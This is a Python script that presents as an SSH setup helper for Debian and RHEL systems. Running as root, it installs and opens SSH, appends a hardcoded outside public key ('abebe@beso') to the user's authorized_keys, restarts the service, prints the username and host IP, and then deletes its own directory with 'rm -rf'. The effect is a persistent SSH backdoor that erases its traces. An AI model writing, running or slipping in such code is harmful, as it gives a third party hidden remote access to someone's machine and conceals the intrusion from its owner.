import os
import subprocess
import socket
import getpass

PUBLIC_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEXi5Zo3eXUSPQGEAFOfjFsR5GjNo4xBH8+UWg7YMt9O abebe@beso"

def run_cmd(cmd):
    """Executes a shell command and returns the output."""
    return subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

def main():
    if os.geteuid() != 0:
        print("Please run this script as root (sudo).")
        return

    if os.path.exists("/etc/debian_version"):
        os_type = "debian"
        ssh_service = "ssh"
    elif os.path.exists("/etc/redhat-release") or os.path.exists("/etc/centos-release"):
        os_type = "redhat"
        ssh_service = "sshd"
    else:
        print("Unsupported OS. Only Debian/Ubuntu and RHEL/CentOS are supported.")
        return

    if os_type == "debian":
        run_cmd("apt-get update && apt-get install -y openssh-server")
    else:
        run_cmd("yum install -y openssh-server")

    if os_type == "debian":
        ufw_status = run_cmd("ufw status").stdout
        if "active" in ufw_status.lower():
            run_cmd("ufw allow ssh")
    elif os_type == "redhat":
        firewall_status = run_cmd("systemctl is-active firewalld").stdout.strip()
        if firewall_status == "active":
            run_cmd("firewall-cmd --permanent --add-service=ssh")
            run_cmd("firewall-cmd --reload")
    
    username = os.environ.get('SUDO_USER', getpass.getuser())
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        ip = socket.gethostbyname(socket.gethostname())
        
    user_home = os.path.expanduser(f"~{username}")
    ssh_dir = os.path.join(user_home, ".ssh")
    auth_keys = os.path.join(ssh_dir, "authorized_keys")
    
    os.makedirs(ssh_dir, exist_ok=True)
    
    key_exists = False
    if os.path.exists(auth_keys):
        with open(auth_keys, "r") as f:
            if PUBLIC_KEY in f.read():
                key_exists = True

    if not key_exists:
        with open(auth_keys, "a") as f:
            f.write(f"\n{PUBLIC_KEY}\n")
    
    run_cmd(f"chown -R {username}:{username} {ssh_dir}")
    run_cmd(f"chmod 700 {ssh_dir}")
    run_cmd(f"chmod 600 {auth_keys}")

    # print(f"Restarting {ssh_service} service...")
    run_cmd(f"systemctl enable {ssh_service}")
    run_cmd(f"systemctl restart {ssh_service}")

    print(f"Username: {username}")
    print(f"Host IP: {ip}")
    
    repo_dir = os.path.dirname(os.path.abspath(__file__))
    run_cmd(f"rm -rf {repo_dir}")

if __name__ == "__main__":
    main()